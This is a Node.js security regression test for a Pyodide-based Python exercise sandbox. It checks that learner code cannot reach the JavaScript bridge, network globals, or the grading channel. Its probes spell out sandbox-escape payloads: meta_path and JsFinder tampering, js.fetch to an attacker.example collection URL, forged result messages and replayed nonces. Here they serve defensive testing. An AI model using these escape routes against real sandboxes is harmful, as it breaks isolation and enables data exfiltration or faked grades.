/* Security regression against a REAL Pyodide 0.26.4.

   Why this file exists
   --------------------
   scripts/test-exercise-worker.cjs drives the worker's Python half through a
   FAKE loadPyodide. That is the right way to test grading logic — it is fast
   and it is hermetic — but it cannot see anything about the runtime itself.
   Two Critical defects were invisible to it, and structurally invisible:

     * the vendor tree was missing pyodide.asm.js, so every first run died
       before a line of learner code ran (the fake never loads a file);
     * `import js` reached the JavaScript globals, so learner code could
       fetch(), eval() and postMessage() out of the sandbox (the fake has no
       js module, so there was nothing to escape to).

   Both read as "all 26 tests pass" from the fake. This file loads the real
   vendored runtime and asks the questions the fake cannot.

   What it asserts
   ---------------
     1. `import js` raises ImportError, and js.fetch / js.eval / js.postMessage
        are unreachable — by any import route, including tampering.
     2. After the boot, the worker's network globals are sealed: fetch,
        XMLHttpRequest, WebSocket and importScripts all throw.
     3. A forged postMessage (no valid nonce) is discarded by the facade.
     4. Ordinary exercises still pass every check kind, on the real runtime.

   Runtime
   -------
   Loads ~13 MB of wasm and compiles it, which takes a few seconds locally and
   a bit longer on a loaded CI machine. Set SILS_REAL_PYODIDE=0 to skip it.

   Usage:  node scripts/test-exercise-sandbox-real.cjs
*/
'use strict';
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const vm = require('node:vm');
const { spawnSync } = require('node:child_process');

const ROOT = path.resolve(__dirname, '..');
const WORKER = path.join(ROOT, 'assets/exercise-worker.js');
const SANDBOX = path.join(ROOT, 'assets/exercise-sandbox.js');
const VENDOR = path.join(ROOT, 'assets/vendor/pyodide');
const VENV_PYTHON = path.join(ROOT, '.venv/Scripts/python.exe');
const PYTHON = process.env.PYTHON || (fs.existsSync(VENV_PYTHON) ? VENV_PYTHON : 'python');

/* The worker, running for real.

   The worker cannot run in node (no Worker, and importScripts has to be
   supplied), so its real source is loaded into a vm context with a scope that
   stands in for a WorkerGlobalScope. Nothing is copied out of the worker, so a
   defect in the shipped file fails here.

   Two things about that scope matter:

     * `loadPyodide` is the GENUINE vendored loader and returns a genuine
       runtime, so the seal and the escape probes run against real Pyodide.
     * the scope really does have fetch / XMLHttpRequest / WebSocket /
       importScripts on it before the worker seals them. Without a global that
       genuinely had them, the network assertions would be checking that a
       property was never there. */
function createRealHost() {
  const source = fs.readFileSync(WORKER, 'utf8');
  let handler = null;
  const replies = [];
  const imported = [];
  let runtime = null;

  // The genuine vendored loader and a genuine runtime. Required rather than
  // reached through the scope's importScripts, because pyodide.js is a UMD
  // bundle that wants node:fs and friends; requiring it puts it in the realm
  // where those exist. The file is still the one that ships, unmodified.
  const pyodideModule = require(path.join(VENDOR, 'pyodide.js'));

  const scope = {
    addEventListener(type, listener) { if (type === 'message') handler = listener; },
    postMessage(message) { replies.push(message); },
    fetch(...args) { scope.fetchCalled = true; return globalThis.fetch(...args); },
    XMLHttpRequest: class { constructor() { scope.xhrUsed = true; } },
    WebSocket: class { constructor() { scope.wsUsed = true; } },
    EventSource: class { },
    // Recorded rather than executed: the loader is required above. The URL is
    // still asserted, because getting it wrong is how the runtime fails to
    // find its own files in a browser.
    importScripts(url) { imported.push(url); },
  };

  const context = {
    self: scope,
    importScripts: url => scope.importScripts(url),
    // Async because the real loadPyodide is: the worker awaits it, and the
    // host has to hold the resolved instance, not the pending promise.
    async loadPyodide(options) {
      const given = (options && options.indexURL) || './vendor/pyodide/';
      const indexURL = path.isAbsolute(given) ? given : path.join(VENDOR, path.sep);
      runtime = await pyodideModule.loadPyodide(Object.assign({}, options, { indexURL }));
      return runtime;
    },
    crypto: globalThis.crypto,
    console,
  };
  context.globalThis = context;
  vm.createContext(context);
  vm.runInContext(source, context, { filename: 'assets/exercise-worker.js' });

  return {
    scope,
    imported,
    get runtime() { return runtime; },
    async run(request) {
      const nonce = request.nonce || 'real-nonce';
      replies.length = 0;
      await handler({ data: Object.assign({ type: 'run', nonce }, request) });
      const result = replies.find(one => one.type === 'result');
      assert.ok(result, 'the worker must answer with a result');
      assert.equal(result.nonce, nonce, 'the worker must echo the nonce it was given');
      return { result, notices: replies.filter(one => one.type === 'loading') };
    },
  };
}

/* The facade, with a Worker stand-in that routes replies through the REAL
   worker, so the nonce check is exercised against genuine worker output rather
   than a hand-written message.

   `holdResults()` is what makes the forged-message case a real test rather than
   a timing accident. See the comment on it. */
function createFacade(realHost) {
  class Worker {
    constructor() {
      this.listeners = new Map();
      this.terminated = false;
      Worker.last = this;
    }
    addEventListener(type, listener) {
      if (!this.listeners.has(type)) this.listeners.set(type, []);
      this.listeners.get(type).push(listener);
    }
    removeEventListener(type, listener) {
      this.listeners.set(type, (this.listeners.get(type) || []).filter(one => one !== listener));
    }
    async postMessage(data) {
      this.sent = data;
      // Started, NOT awaited: the run is genuinely in flight from this line on,
      // and control comes back to the test while it is still going.
      const inFlight = realHost.run(data);
      // The gate is read here, before the reply is delivered, so arming it has
      // to happen before the run is posted.
      if (Worker.gate) await Worker.gate;
      const { result, notices } = await inFlight;
      for (const notice of notices) this.emit('message', { data: notice });
      this.emit('message', { data: result });
    }
    terminate() { this.terminated = true; }
    emit(type, event) { for (const listener of (this.listeners.get(type) || [])) listener(event); }
    /* Delivers a message the worker did NOT produce — the forgery route. */
    forge(message) { this.emit('message', { data: message }); }
  }
  Worker.last = null;
  Worker.gate = null;
  const module = { exports: {} };
  const context = {
    module, exports: module.exports, Worker, setTimeout, clearTimeout,
    crypto: globalThis.crypto,
  };
  vm.createContext(context);
  vm.runInContext(fs.readFileSync(SANDBOX, 'utf8'), context, { filename: 'assets/exercise-sandbox.js' });
  return {
    api: module.exports,
    Worker,
    /* Withhold the genuine reply until the returned function is called. ARM THIS
       BEFORE posting the run.

       Why it exists: the original version of the forged-message case waited for
       a poll to observe a posted message and only then forged, but by then the
       real run had already finished, `finish()` had resolved the promise and
       removed the listeners. The forgery was landing on a settled promise, so
       the case passed with the nonce check deleted — it proved nothing.

       A node stand-in shares one thread with the worker, so it cannot give the
       test the mid-run window a browser hands for free (in a browser the main
       thread is independent and a forgery can arrive whenever the attacker
       likes). Gating the reply reproduces that window deterministically: the
       worker has started, the facade has not been answered, and the listeners
       are provably still attached. */
    holdResults() {
      let open;
      Worker.gate = new Promise(resolve => { open = resolve; });
      return () => { Worker.gate = null; open(); };
    },
  };
}

/* Runs a snippet on the real runtime and reports how it ended. */
function tryPython(runtime, code) {
  try {
    const value = runtime.runPython(code);
    return { ok: true, value: String(value === undefined ? '' : value) };
  } catch (error) {
    return { ok: false, error: String(error && error.message || error) };
  }
}

const CASES = [];
const caseOf = (name, fn) => CASES.push([name, fn]);

/* ---------------------------------------------------------------- probes -- */

caseOf('the vendored runtime actually boots from the repository', async host => {
  assert.ok(fs.existsSync(path.join(VENDOR, 'pyodide.asm.js')),
    'pyodide.asm.js must be vendored or nothing here can run');
  await host.run({ code: 'pass\n', checks: [] });
  assert.equal(host.runtime.version, '0.26.4');
  assert.deepEqual(host.imported, ['./vendor/pyodide/pyodide.js']);
});

caseOf('import js raises ImportError on the real runtime', async host => {
  await host.run({ code: 'pass\n', checks: [] });
  const outcome = tryPython(host.runtime, 'import js');
  assert.equal(outcome.ok, false, 'import js must not succeed');
  assert.match(outcome.error, /ImportError/,
    `expected an ImportError, got: ${String(outcome.error || '').slice(-160)}`);
});

caseOf('js.fetch, js.eval and js.postMessage are all unreachable', async host => {
  await host.run({ code: 'pass\n', checks: [] });
  for (const attempt of [
    ['js.fetch', 'import js\njs.fetch("https://attacker.example/collect")'],
    ['js.eval', 'import js\njs.eval("1+1")'],
    ['js.postMessage', 'import js\njs.postMessage({"type":"result"})'],
    ['from js import eval', 'from js import eval'],
    ['js in a function', 'def go():\n    import js\n    return js\ngo()'],
    ['importlib.import_module("js")', 'import importlib\nimportlib.import_module("js")'],
    ['__import__("js")', '__import__("js")'],
    ['pyodide_js', 'import pyodide_js'],
    ['pyodide.code.eval_js', 'from pyodide.code import eval_js'],
  ]) {
    const outcome = tryPython(host.runtime, attempt[1]);
    assert.equal(outcome.ok, false, `${attempt[0]} must not be reachable`);
  }
});

caseOf('no route to the bridge: seven meta_path routes and six import routes', async host => {
  await host.run({ code: 'pass\n', checks: [] });

  // The baseline the seal builds from must not contain a finder that can serve
  // the bridge AT ALL -- otherwise `sys.meta_path = list(sys.meta_path)[1:]`
  // reassigns an attribute of the sys module, reaches no list mutator, and
  // walks straight past a guard that only ever intercepted clear()/remove().
  const before = tryPython(host.runtime, 'import sys\n[type(f).__name__ for f in sys.meta_path]');
  assert.equal(before.ok, true, before.error);
  assert.ok(!before.value.split(', ').includes('JsFinder'),
    `the sealed baseline must not contain JsFinder, got ${before.value}`);

  const ROUTES = [
    ['sys.meta_path = list(meta_path)[1:]', 'import sys\nsys.meta_path = list(sys.meta_path)[1:]\nimport js'],
    ['sys.meta_path = tuple(meta_path)', 'import sys\nsys.meta_path = tuple(sys.meta_path)\nimport js'],
    ['sys.meta_path = list(meta_path)[:]', 'import sys\nsys.meta_path = list(sys.meta_path)[:]\nimport js'],
    ['sys.meta_path.clear()', 'import sys\nsys.meta_path.clear()\nimport js'],
    ['sys.meta_path[:] = []', 'import sys\nsys.meta_path[:] = []\nimport js'],
    ['del sys.meta_path[:]', 'import sys\ndel sys.meta_path[:]\nimport js'],
    ["sys.modules['js'] = None", 'import sys\nsys.modules["js"] = None\nimport js'],
    // Routes that reach the finder object rather than the list it sits in.
    // pyodide._state.jsfinder is the LIVE singleton with js in its jsproxies
    // table, so a seal that only filtered sys.meta_path would leave this open.
    ['append pyodide._state.jsfinder', 'import sys, pyodide._state as st\nsys.meta_path.append(st.jsfinder)\nimport js'],
    ['sys.meta_path = [pyodide._state.jsfinder]', 'import sys, pyodide._state as st\nsys.meta_path = [st.jsfinder]\nimport js'],
    ['insert(0, pyodide._state.jsfinder)', 'import sys, pyodide._state as st\nsys.meta_path.insert(0, st.jsfinder)\nimport js'],
    ['construct a fresh JsFinder', 'import sys\nfrom _pyodide._importhook import JsFinder\nsys.meta_path.append(JsFinder())\nimport js'],
    // The import routes, all of which must fail on their own.
    ['import js', 'import js'],
    ['importlib.import_module("js")', 'import importlib\nimportlib.import_module("js")'],
    ['__import__("js")', '__import__("js")'],
    ['from js import eval', 'from js import eval'],
    ['import pyodide_js', 'import pyodide_js'],
    ['js re-added to sys.modules then imported', 'import sys, pyodide._state as st\n'
      + 'sys.modules["js"] = st.jsfinder.jsproxies.get("js")\nimport js'],
  ];
  for (const [name, code] of ROUTES) {
    const outcome = tryPython(host.runtime, code);
    assert.equal(outcome.ok, false,
      `${name} must not reach the bridge, got: ${String(outcome.value || '').slice(0, 120)}`);
  }

  // sys.modules and find_spec must report the module as absent, not merely
  // refuse to import it. A namespace that answered with a live object would
  // leak the bridge through the back door.
  for (const [name, code] of [
    ["sys.modules['js']", 'import sys\nassert sys.modules["js"] is None'],
    ["importlib.util.find_spec('js')", 'import importlib.util as u\nassert u.find_spec("js") is None'],
  ]) {
    const outcome = tryPython(host.runtime, code);
    assert.equal(outcome.ok, true, `${name} must report the bridge as absent: ${String(outcome.error || '').slice(-140)}`);
  }

  // And the seal must be re-armed for the NEXT run, not just the current one.
  const second = await host.run({ code: 'import sys\nsys.meta_path.clear()\n', checks: [] });
  assert.equal(second.result.ok, true, 'tampering itself is legal learner code');
  assert.equal(tryPython(host.runtime, 'import js').ok, false,
    'the next run must still be sealed');
  // A learner who re-attached the live finder must not have bought the next run
  // anything either: the seal empties the table again before every run.
  await host.run({ code: 'import sys, pyodide._state as st\nsys.meta_path = [st.jsfinder]\n', checks: [] });
  assert.equal(tryPython(host.runtime, 'import js').ok, false,
    'a re-attached live finder must be emptied again before the next run');
});

caseOf('the network globals are sealed after the runtime boots', async host => {
  await host.run({ code: 'pass\n', checks: [] });
  // Each of these was a working global before the seal; a scope that never had
  // them would make this case pass for the wrong reason.
  for (const name of ['fetch', 'XMLHttpRequest', 'WebSocket', 'importScripts']) {
    assert.equal(typeof host.scope[name], 'function', `${name} must still be a function`);
    assert.throws(() => host.scope[name]('https://attacker.example/x'), /disabled inside the exercise sandbox/,
      `${name} must refuse to work once the runtime is up`);
  }
  assert.equal(host.scope.fetchCalled, undefined, 'sealing fetch must stop it reaching the network');
  assert.equal(host.scope.xhrUsed, undefined, 'XMLHttpRequest must not have been constructed');
  assert.equal(host.scope.wsUsed, undefined, 'WebSocket must not have been constructed');
});

caseOf('the seal does not break ordinary Python', async host => {
  const { result } = await host.run({
    code: 'name = "Ada"\nprint(f"I am {name}")\n',
    checks: [{ kind: 'stdout_contains', value: 'I am Ada', weight: 1 }],
  });
  assert.equal(result.ok, true);
  assert.equal(result.stdout, 'I am Ada\n');
  // Every module here ships in Pyodide's own stdlib; `statistics`, `ssl` and
  // `sqlite3` are deliberately absent from it upstream, so they are not in this
  // list and must not be mistaken for seal damage.
  for (const snippet of [
    'import json; json.dumps({"a": 1})',
    'import math, re, string, random, itertools, functools, operator',
    'import collections; collections.Counter("aab").most_common()',
    'import csv, io; list(csv.reader(io.StringIO("a,b")))',
    'import textwrap; textwrap.shorten("a b c d", 5)',
    'import unicodedata; unicodedata.name("A")',
    'import datetime; datetime.datetime.now().year > 2000',
    'import fractions, decimal; str(fractions.Fraction(1, 3))',
    'import heapq, bisect, copy, pprint; bisect.bisect_left([1, 2, 3], 2)',
    'import enum, abc, dataclasses, typing; dataclasses.make_dataclass',
    'open("/tmp/sandbox-probe", "w").write("hi")',
  ]) {
    const outcome = tryPython(host.runtime, snippet);
    assert.equal(outcome.ok, true,
      `the seal broke \`${snippet}\`:\n${String(outcome.error || 'no error text')}`);
  }
});

caseOf('wiping sys.meta_path does not break the session afterwards', async host => {
  // A seal that rebuilt itself from the CURRENT meta_path would, after learner
  // code ran `sys.meta_path = []`, end up with a sealed list holding only the
  // guard: every pure-Python stdlib import would fail for the rest of the
  // session, with no way for the learner to tell why.
  await host.run({ code: 'import sys\nsys.meta_path = []\n', checks: [] });
  const outcome = tryPython(host.runtime, 'import collections; collections.Counter("ab").most_common()');
  assert.equal(outcome.ok, true,
    `the import system must recover from a wiped meta_path: ${String(outcome.error || '').split('\n').slice(-1)[0]}`);
  assert.equal(tryPython(host.runtime, 'import js').ok, false, 'and must still be sealed');
});

/* -------------------------------------------------------------- the facade -- */

caseOf('a forged postMessage is discarded while the run is still pending', async host => {
  const box = createFacade(host);
  const sandbox = box.api.create({});
  const checks = [{ kind: 'assert_python', code: 'assert False', weight: 1 }];

  // ARM THE GATE FIRST: once the run is posted the genuine reply is already on
  // its way to the facade, and the window this case is about would be gone.
  const release = box.holdResults();

  // The learner code runs to completion and its own check FAILS (assert False),
  // which is what makes a forged "everything passed" distinguishable from the
  // truth. No busy loop: the stand-in shares one thread with the real worker,
  // so learner code that burns CPU would block this process outright.
  let settled = false;
  const running = sandbox.run({ code: 'x = 1\nprint("real run")\n', checks })
    .then(value => { settled = true; return value; });

  const worker = await new Promise(resolve => {
    const tick = () => (box.Worker.last && box.Worker.last.sent ? resolve(box.Worker.last) : setTimeout(tick, 5));
    tick();
  });
  assert.ok(worker.sent, 'the facade must have posted a run');
  const nonce = worker.sent.nonce;

  // The point of the case: at this instant the run is NOT settled and the
  // facade still has its listener attached, so what happens next is a decision
  // the nonce check actually made rather than a message landing on a promise
  // that had already resolved.
  assert.equal(settled, false, 'the run must still be pending when the forgery lands');

  // Exactly the message unhardened learner code could send through
  // `js.postMessage`: a perfect result, no nonce.
  worker.forge({
    type: 'result', ok: true, stdout: 'forged', values: {},
    outcomes: checks.map(() => ({ ok: true, detail: '' })),
  });
  // ...and a near-miss with the right shape but the wrong nonce.
  worker.forge({
    type: 'result', nonce: 'deadbeef', ok: true, stdout: 'forged',
    values: {}, outcomes: checks.map(() => ({ ok: true, detail: '' })),
  });
  // ...and a replay of the worker's own `loading`, WITH the valid nonce. That is
  // the one a real attacker can get, because the nonce rides the wire. If it
  // were honoured a second time it would clear the running execution timer and
  // restart the 15-second budget, so an infinite loop would never time out.
  worker.forge({ type: 'loading', nonce });
  assert.equal(settled, false,
    'a forged result must not settle the run, and a replayed loading must not re-arm the clock');

  // Now let the genuine reply through and take the real verdict.
  release();
  const result = await running;

  assert.equal(result.outcomes.length, checks.length);
  assert.equal(result.outcomes[0].ok, false,
    'the forged "all passed" outcome must not have been believed');
  assert.equal(result.ok, true, 'the learner code itself runs fine — only its check fails');
  assert.equal(result.stdout, 'real run\n', 'and the forged stdout must not have been believed either');
});

caseOf('a replayed loading cannot reset the execution clock', async host => {
  const box = createFacade(host);
  // A short execution budget, and the genuine reply held forever, so the run
  // can only end one way: the execution timeout firing.
  const BUDGET = 400;
  const sandbox = box.api.create({ timeoutMs: BUDGET });
  const release = box.holdResults();
  const started = Date.now();
  let settled = null;
  const running = sandbox.run({ code: 'pass\n', checks: [{ kind: 'stdout_contains', value: 'x', weight: 1 }] })
    .then(value => { settled = value; return value; });

  const worker = await new Promise(resolve => {
    const tick = () => (box.Worker.last && box.Worker.last.sent ? resolve(box.Worker.last) : setTimeout(tick, 5));
    tick();
  });
  const nonce = worker.sent.nonce;

  // The real worker's own `loading`, replayed over and over, each carrying the
  // valid nonce. The nonce rides the wire, so this is exactly what an attacker
  // who can reach postMessage is able to send.
  //
  // Replayed for much LONGER than the budget on purpose. Honouring a second
  // `loading` clears the running execution timer and starts a fresh one, so a
  // facade that accepts the replay simply cannot time out until the attacker
  // stops: the deadline keeps moving to "now + budget". This case stops
  // replaying after a fixed window and then asserts the run died on schedule.
  const replayUntil = started + BUDGET * 4;
  while (Date.now() < replayUntil && !settled) {
    worker.forge({ type: 'loading', nonce });
    await new Promise(resolve => setTimeout(resolve, 20));
  }

  const result = await running;
  release();
  const elapsed = Date.now() - started;
  assert.equal(result.reason, 'timeout',
    `the run must still time out, got reason=${result.reason} elapsed=${elapsed}ms`);
  assert.ok(elapsed < BUDGET * 2,
    `replayed loading messages must not restart the execution clock: ${elapsed}ms elapsed on a ${BUDGET}ms budget`);
});

caseOf('a real run passes every check kind on the real runtime', async host => {
  const box = createFacade(host);
  const sandbox = box.api.create({});
  const result = await sandbox.run({
    code: 'name = "Ada"\nrole = "Agent"\nscore = 7\nprint(f"I am {name}, I want to learn {role}")\n',
    checks: [
      { kind: 'stdout_matches', pattern: 'I am [\\s\\S]{1,20},\\s*I want to learn\\s*[^\\s]', weight: 6 },
      { kind: 'assert_python', code: 'assert isinstance(name, str) and name.strip()', weight: 2 },
      { kind: 'var_equals', name: 'name', value: 'Ada', weight: 2 },
      { kind: 'var_in_range', name: 'score', min: 5, max: 10, weight: 1 },
      { kind: 'stdout_contains', value: 'I am Ada', weight: 3 },
      { kind: 'output_choice', correct: ['A', 'B'], weight: 1 },
    ],
    answer: ['A', 'B'],
  });
  assert.equal(result.ok, true, `the exercise failed: ${result.error}`);
  assert.deepEqual(result.outcomes.map(one => one.ok), [true, true, true, true, true, true]);
  assert.deepEqual(result.values.name, 'Ada');
  assert.deepEqual(result.values.score, 7);
});

caseOf('a crash inside learner code is reported, not swallowed', async host => {
  const box = createFacade(host);
  const sandbox = box.api.create({});
  const result = await sandbox.run({
    code: 'print("before")\nraise ValueError("boom")\n',
    checks: [{ kind: 'stdout_contains', value: 'before', weight: 1 }],
  });
  assert.equal(result.ok, false);
  assert.match(result.error, /ValueError: boom/);
  assert.equal(result.stdout, 'before\n');
});

caseOf('a stale global does not survive into the next run on the real runtime', async host => {
  const box = createFacade(host);
  const sandbox = box.api.create({});
  await sandbox.run({ code: 'total = 5\n_secret = 9\n', checks: [] });
  const second = await sandbox.run({
    code: 'pass\n',
    checks: [
      { kind: 'var_equals', name: 'total', value: 5, weight: 1 },
      { kind: 'var_equals', name: '_secret', value: 9, weight: 1 },
    ],
  });
  assert.deepEqual(second.outcomes.map(one => one.ok), [false, false],
    'nothing from the previous run may satisfy this run');
});

/* ------------------------------------------------------------------ corpus -- */

caseOf('every corpus reference scores the same on the real runtime', async host => {
  const items = harnessVerdicts();
  assert.ok(items.length >= 9, `expected the frozen corpus, found ${items.length}`);
  let compared = 0;
  for (const entry of items) {
    const { item, where, expected, problem } = entry;
    const checks = item.checks || [];
    const { result } = await host.run({ code: item.reference || '', checks });
    assert.equal(result.outcomes.length, checks.length,
      `${where}: outcomes must stay aligned with checks`);

    if (problem) {
      // The harness refuses a reference that raises or needs the starter: it
      // reports the reference as a failure and produces NO per-check verdicts.
      // The worker's route to the same verdict is __sils_ok = False, which
      // blanks every sandbox check. stdout_* checks are the documented
      // exception -- the worker grades the output printed before the crash,
      // while the harness reports the whole reference as failed.
      for (const [index, one] of result.outcomes.entries()) {
        if (['assert_python', 'var_equals', 'var_in_range'].includes(checks[index].kind)) {
          assert.equal(one.ok, false,
            `${where}: a crashed run must score zero on a sandbox check (harness: ${problem})`);
        }
      }
      continue;
    }

    // THE ACTUAL COMPARISON. Every check the harness graded, item by item.
    // The previous version of this case read `if (result.ok) continue;`, and
    // since all 18 references score 100% that skipped every one of them -- the
    // case asserted only that outcomes.length matched, despite its name
    // promising the runtime and the harness agree on scores.
    assert.equal(result.ok, true,
      `${where}: the worker must run this reference cleanly (${result.error || 'raised'})`);
    for (const [index, one] of result.outcomes.entries()) {
      assert.equal(one.ok, expected[index],
        `${where}: check ${index} (${checks[index].kind}) — real Pyodide says ` +
        `${one.ok}, the harness says ${expected[index]}; ${JSON.stringify(checks[index]).slice(0, 200)}`);
      compared += 1;
    }
  }
  assert.ok(compared >= 90,
    `expected the harness verdicts to be compared item by item, only compared ${compared}`);
});

/* The harness's OWN verdict for every corpus reference, one boolean per check.

   Computed by importing scripts/check_exercise_references.py -- the same module
   scripts/test-exercise-worker.cjs probes -- and calling its own solve() and
   outcome(), so "the runtime and the harness agree" is a comparison against the
   harness rather than a second opinion written by this file. Checks the harness
   leaves ungraded (output_choice, self_assessed: they need a learner answer the
   harness has no way to supply) come back as null and are compared against the
   worker's fail-closed 'not evaluated' instead. */
function harnessVerdicts() {
  const probe = `
import json, sys
from pathlib import Path
sys.path.insert(0, str(Path(sys.argv[1]).resolve()))
import check_exercise_references as H
items = []
for lang, where, item in H.executable_items():
    if item['type'] not in H.EXECUTABLE_TYPES:
        continue
    mode, stdout, namespace, problem = H.solve(item)
    expected = []
    if problem is None:
        for check in (item.get('checks') or []):
            outcome = H.outcome(check, stdout, namespace)
            expected.append(False if outcome is None else bool(outcome))
    items.append({
        'where': where,
        'problem': problem,
        'expected': expected,
        'item': {k: item.get(k) for k in ('id', 'type', 'checks', 'reference')},
    })
print(json.dumps(items))
`;
  const run = spawnSync(PYTHON, ['-X', 'utf8', '-c', probe, path.join(ROOT, 'scripts')], {
    encoding: 'utf8', maxBuffer: 64 * 1024 * 1024,
  });
  if (run.status !== 0) throw new Error(`harness probe failed: ${String(run.stderr || '').trim()}`);
  return JSON.parse(run.stdout);
}

/* -------------------------------------------------------------------- main -- */

async function main() {
  if (process.env.SILS_REAL_PYODIDE === '0') {
    console.log('ExerciseSandboxReal\n  skip  SILS_REAL_PYODIDE=0');
    console.log('\nSKIP: real Pyodide checks were not run');
    return;
  }
  console.log('ExerciseSandboxReal');
  let failures = 0;
  // ONE host for the whole run: booting the runtime is the expensive part, and
  // sharing it means each case inherits the state the previous one left, which
  // is what a real long-lived worker does.
  const host = createRealHost();

  for (const [name, fn] of CASES) {
    try {
      await fn(host);
      console.log(`  ok  ${name}`);
    } catch (error) {
      failures += 1;
      console.error(`  FAIL ${name}\n       ${error.message}`);
    }
  }
  if (failures) {
    console.error(`\n${failures} failing`);
    process.exit(1);
  }
  console.log('\nPASS: the sandbox holds against a real Pyodide runtime');
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
